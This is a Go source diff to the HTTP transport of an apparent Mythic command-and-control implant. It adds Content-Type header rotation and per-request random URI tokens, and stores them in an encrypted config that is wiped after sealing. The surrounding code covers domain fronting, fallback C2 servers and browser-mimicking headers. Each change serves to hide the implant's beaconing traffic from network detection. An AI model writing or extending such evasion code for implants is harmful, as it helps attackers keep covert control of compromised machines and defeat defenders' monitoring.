@@ -49,6 +49,7 @@ type sensitiveConfig struct {
 	GetEndpoint   string            `json:"g"`
 	PostEndpoint  string            `json:"p"`
 	CustomHeaders map[string]string `json:"x,omitempty"`
+	ContentTypes  []string          `json:"ct,omitempty"`
 }
 
 // HTTPProfile handles HTTP communication with Mythic
@@ -64,8 +65,10 @@ type HTTPProfile struct {
 	PostEndpoint  string
 	HostHeader    string            // Override Host header for domain fronting
 	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
+	ContentTypes  []string          // Content-Type rotation pool for request body
 	client        *http.Client
 	CallbackUUID  string // Store callback UUID from initial checkin
+	ctIndex       atomic.Uint32 // Round-robin index for Content-Type rotation
 
 	// Fallback C2 URLs for automatic failover when primary is unreachable.
 	FallbackURLs []string
@@ -98,7 +101,7 @@ type HTTPProfile struct {
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs []string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -111,6 +114,7 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		PostEndpoint:  postEndpoint,
 		HostHeader:    hostHeader,
 		FallbackURLs:  fallbackURLs,
+		ContentTypes:  contentTypes,
 	}
 
 	// Configure TLS based on verification mode
@@ -170,6 +174,7 @@ func (h *HTTPProfile) SealConfig() error {
 		GetEndpoint:   h.GetEndpoint,
 		PostEndpoint:  h.PostEndpoint,
 		CustomHeaders: h.CustomHeaders,
+		ContentTypes:  h.ContentTypes,
 	}
 
 	plaintext, err := json.Marshal(cfg)
@@ -197,6 +202,7 @@ func (h *HTTPProfile) SealConfig() error {
 	h.GetEndpoint = ""
 	h.PostEndpoint = ""
 	h.CustomHeaders = nil
+	h.ContentTypes = nil
 
 	return nil
 }
@@ -217,6 +223,7 @@ func (h *HTTPProfile) getConfig() *sensitiveConfig {
 			GetEndpoint:   h.GetEndpoint,
 			PostEndpoint:  h.PostEndpoint,
 			CustomHeaders: h.CustomHeaders,
+			ContentTypes:  h.ContentTypes,
 		}
 	}
 
@@ -824,6 +831,69 @@ func (h *HTTPProfile) allURLs(cfg *sensitiveConfig) []string {
 	return urls
 }
 
+// resolveURITokens replaces randomization tokens in a URI path at request time.
+// Supported tokens:
+//   - {rand:N}  — N random hex characters (e.g., {rand:8} → "a3f82b1c")
+//   - {int:M-N} — random integer between M and N (e.g., {int:1-100} → "42")
+//
+// If the path contains no tokens, it is returned unchanged (backward-compatible).
+func resolveURITokens(path string) string {
+	if !strings.Contains(path, "{") {
+		return path
+	}
+
+	result := path
+
+	// Replace {rand:N} tokens
+	for {
+		start := strings.Index(result, "{rand:")
+		if start == -1 {
+			break
+		}
+		end := strings.Index(result[start:], "}")
+		if end == -1 {
+			break
+		}
+		end += start
+		nStr := result[start+6 : end]
+		n := 8 // default length
+		if parsed, err := fmt.Sscanf(nStr, "%d", &n); err != nil || parsed != 1 || n <= 0 {
+			n = 8
+		}
+		if n > 64 {
+			n = 64
+		}
+		b := make([]byte, (n+1)/2)
+		rand.Read(b)
+		result = result[:start] + hex.EncodeToString(b)[:n] + result[end+1:]
+	}
+
+	// Replace {int:M-N} tokens
+	for {
+		start := strings.Index(result, "{int:")
+		if start == -1 {
+			break
+		}
+		end := strings.Index(result[start:], "}")
+		if end == -1 {
+			break
+		}
+		end += start
+		rangeStr := result[start+5 : end]
+		var lo, hi int
+		if _, err := fmt.Sscanf(rangeStr, "%d-%d", &lo, &hi); err != nil || lo >= hi {
+			result = result[:start] + "0" + result[end+1:]
+			continue
+		}
+		b := make([]byte, 4)
+		rand.Read(b)
+		val := lo + int(uint32(b[0])<<24|uint32(b[1])<<16|uint32(b[2])<<8|uint32(b[3]))%(hi-lo+1)
+		result = result[:start] + fmt.Sprintf("%d", val) + result[end+1:]
+	}
+
+	return result
+}
+
 // makeRequest is a helper function to make HTTP requests with automatic failover.
 // If the primary URL fails, it tries each fallback URL before returning an error.
 // The cfg parameter provides sensitive fields (BaseURL, UserAgent, etc.)
@@ -833,13 +903,19 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 	userAgent := h.UserAgent
 	hostHeader := h.HostHeader
 	var customHeaders map[string]string
+	var contentTypes []string
 	if cfg != nil {
 		userAgent = cfg.UserAgent
 		hostHeader = cfg.HostHeader
 		customHeaders = cfg.CustomHeaders
+		contentTypes = cfg.ContentTypes
 	} else {
 		customHeaders = h.CustomHeaders
+		contentTypes = h.ContentTypes
 	}
+
+	// Resolve URI randomization tokens (e.g., /api/v{int:1-3}/{rand:8})
+	path = resolveURITokens(path)
 
 	// Get all URLs in failover order (rotated so active URL is first)
 	originalIdx := int(h.activeURLIdx.Load())
@@ -871,7 +947,13 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte, cfg *sensiti
 		// Set browser-realistic default headers
 		req.Header.Set("User-Agent", userAgent)
 		if body != nil {
-			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			// Cycle through configured content types, or use default
+			ct := "application/x-www-form-urlencoded"
+			if len(contentTypes) > 0 {
+				idx := h.ctIndex.Add(1) - 1
+				ct = contentTypes[idx%uint32(len(contentTypes))]
+			}
+			req.Header.Set("Content-Type", ct)
 		}
 		req.Header.Set("Accept", chromeAcceptHeader)
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
